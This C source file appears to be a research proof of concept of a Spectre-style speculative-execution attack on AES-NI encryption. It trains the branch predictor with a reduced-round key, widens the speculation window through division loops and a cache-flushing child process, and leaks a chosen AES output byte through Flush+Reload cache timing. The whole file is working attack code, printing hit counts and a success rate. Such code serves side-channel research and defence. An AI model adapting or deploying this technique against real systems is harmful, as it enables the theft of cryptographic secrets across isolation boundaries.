#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include "aes.h"
#include <x86intrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>

//AESNI definitions
#define AES_encrypt aesni_encrypt
extern void aesni_encrypt(const unsigned char *in, unsigned char *out, const AES_KEY *key);
#define private_AES_set_encrypt_key aesni_set_encrypt_key
extern void private_AES_set_encrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);

#define AESSIZE 16
#define TRAINING 128
const size_t threshold = 100;
 int Nsamples = 1000;

uint32_t OPENSSL_ia32cap_P[4] = { 0 };

typedef uint8_t aes_t[16];

void tobinary(char *data, aes_t aes) {
  assert(strlen(data)==AESSIZE*2);
  unsigned int x;
  for (int i = 0; i < AESSIZE; i++) {
    sscanf(data+i*2, "%2x", &x);
    aes[i] = x;
  }
}

uint64_t time_access(volatile uint8_t* ptr, size_t index){
    uint32_t junk;
    uint64_t start = __rdtscp(&junk);
    ptr[index]++;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}


void flush(volatile void* ptr, size_t length) { // was volatile void* ptr
    uint8_t* byte_ptr = (uint8_t*)ptr;

    // Align to cache line
    length += (uintptr_t)byte_ptr & 0x3F;
    byte_ptr = (uint8_t*)((uintptr_t)byte_ptr & ~0x3F);

    // Flush every cacheline making up element
    for(size_t i = 0; i < length; i += 64){
        _mm_clflush(byte_ptr + i);
    }
}

volatile uint32_t spin_junk = 0;
//Division instructions take a long time to execute,
//so this code tells the processor to
void open_speculation_window()
{       
    for(size_t i = 0; i < 200; i++) //i < 100 is the original
    {
        spin_junk = ((spin_junk + 1) * spin_junk) / (spin_junk - 1);
    }                                                                   
}

void randaes(aes_t aes) {
  for (int i = 0; i < AESSIZE; i++)
    aes[i] = rand() & 0xff;
}


int main(int ac, char **av)
{
            /*
              ---Get user inputted parameters for the attack---
            */
  printf("/------------- SPECTRE AGAINST AES-NI -------------/\n");
  int bytetoleak = 0;
  int roundstotrain = 0;
  int roundsarchitectural = 0;
  printf("Which byte do you want to leak? (0-15): ");
  int x = scanf("%d", &bytetoleak);
  if(bytetoleak > 15 || bytetoleak < 0)
  {
    printf("Please enter a valid byte. Shutting down...\n");
    exit(1);
  }
  printf("How many rounds to train? (>0): ");
  x = scanf("%d", &roundstotrain);
  printf("How many rounds to perform architecturally? (>0): ");
  x = scanf("%d", &roundsarchitectural);
  printf("How many samples? ");
  x = scanf("%d", &Nsamples);

  printf("/------------- LAUNCHING SPECTRE ATTACK ON AES-NI -------------/\n");
  printf("Leaking byte %d | training on %d rounds | running on %d rounds architecturally\n", bytetoleak, roundstotrain, roundsarchitectural);
  printf("Number of samples: %d\n", Nsamples);

            /*
              ---AES stuff---
            */
  aes_t key, input, output;
  //tobinary("2b7e151628aed2a6abf7158809cf4f3c", key);
  tobinary("00000000000000000000000000000000", key);
  //bzero the aes key.

  //Set the key bits
	  //128 bit key is 10 rounds.
	  //192 bit key is 12 rounds.
	  //256 bit key is 14 rounds.
  int trainingKey = 128;
  int architecturalKey = 192;
  //printf("Training Key: %d\n", trainingKey);
  //printf("Architectural Key: %d\n", architecturalKey);

            /*
              ---Spectre stuff---
            */
  //size_t successes[16] = {0};
  //volatile uintptr_t base        = (uintptr_t)malloc(100*1024*1024);
  volatile uintptr_t base          =  (uintptr_t)mmap( NULL,
                                      100*1024*1024,
                                      PROT_READ | PROT_WRITE | PROT_EXEC,
                                      MAP_SHARED | MAP_ANONYMOUS,
                                      0, 0);
  memset((void*)base, 0, 100*1024*1024);

  base							               = ((base/4096)*4096) + 4096; //align to page
  AES_KEY* aeskey1                 = (AES_KEY*)(base + 4096*1 + 16); //64 bytes is a cacheline. +16 to align to cacheline
  AES_KEY* aeskey2                 = (AES_KEY*)(base + 4096*2 + 16);
  volatile uint8_t* probe          = (uint8_t*)(base + 4096*3);
  //volatile uint8_t* textProbe	     = (uint8_t*)(base + 4096*4);
  //volatile uint8_t* faketextProbe  = textProbe + 4096*257;
  volatile uint8_t* fakeProbe      = probe + 4096*257;
  volatile size_t   probe_length   = 4096*256;
  volatile uint8_t* chosenProbe;
  volatile uint8_t* chosenText;
  AES_KEY* chosenKey;

  //Set the encrypt keys with their respective values
  private_AES_set_encrypt_key(key, trainingKey, aeskey1);
  private_AES_set_encrypt_key(key, architecturalKey, aeskey2);

  aeskey2->rounds = roundsarchitectural;
  AES_encrypt(input, output, aeskey2); //aeskey1
  int expected = output[bytetoleak];
  printf("K byte: %d\n", output[bytetoleak]);
  aeskey2->rounds = roundstotrain;
  AES_encrypt(input, output, aeskey2);
  printf("T byte: %d\n", output[bytetoleak]);
  int t_val = output[bytetoleak];
  aeskey2->rounds = roundsarchitectural;
  aeskey1->rounds = roundstotrain;


  printf("\n\tResults:\n");
  int numSuccesses = 0;

  int pid = fork();
  if(pid == 0) 
  //child process. Continually flushes the cache.
  {
    volatile int value = 1;
    while(value)
    {
      flush( (void*)(( (uintptr_t)aeskey2) + 240), 64);  //flushing opens the speculation window more. Flush through multiple threads.
    }
  }
  else
  {
  //Main proess. Training loop commences.
    for(int sample = 0; sample < Nsamples; sample++)
    {
      //Flush the probe and keys
      flush(probe, probe_length);
      for(int i = 0; i < TRAINING+1; i++)
      {
        //Choose the probe here: use the fake during training and the real during misspeculation .   
        int mask = (i - TRAINING) >> 31;  
        uintptr_t fake = mask & (uintptr_t)fakeProbe;
        uintptr_t real = ~mask & (uintptr_t)probe;
        uintptr_t probeAddress = fake | real;
        chosenProbe = (volatile uint8_t*)probeAddress;

        //Choose the key: key1 during training and key2 during the actual execution
        uintptr_t key1 = mask & (uintptr_t)aeskey1;
        uintptr_t key2 = ~mask & (uintptr_t)aeskey2;
        uintptr_t keyAddress = key1 | key2;
        chosenKey = (AES_KEY*)keyAddress;

        //Serialise instructions and open speculation window
        _mm_mfence();
        spin_junk = 0;
        open_speculation_window();
        spin_junk = 1;

        //Run encryption   
        AES_encrypt(input, output, chosenKey);

        //print first byte of output
        chosenProbe[output[bytetoleak]*4096]++;
      }

      //Do the cache timing for number of successes
      for(int i = 0; i<256; i++)
      {
        uint64_t timeTaken  = time_access(probe, i * 4096);
        if(timeTaken < threshold && i == t_val) //
        {
             //successes[i]++;
          printf("HIT for sample %d\t: %d\n", sample, i);
          numSuccesses++;
        }
      }

    }

    //Print results
    /*for(int i = 0; i < 16; i++)
    {
      if(successes[i] > 0)
      {
        printf("i is %d (%d rounds): %ld\n",i, i*2, successes[i]);
      }
    }*/

    printf("Success rate: %f\n", (double)numSuccesses/Nsamples);
    printf("/------------- FINISHED -------------/\n");
    kill(pid,9);
    return 0;
  }

}
